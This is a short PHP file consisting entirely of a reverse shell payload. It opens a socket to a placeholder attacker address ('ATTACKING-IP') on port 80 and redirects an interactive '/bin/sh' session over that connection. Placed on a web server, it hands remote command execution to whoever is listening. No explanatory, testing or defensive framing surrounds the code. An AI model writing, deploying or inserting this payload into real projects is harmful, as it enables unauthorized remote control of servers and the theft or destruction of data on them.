<?php
	$sock=fsockopen("ATTACKING-IP",80);
	exec("/bin/sh -i <&3 >&3 2>&3");
?>
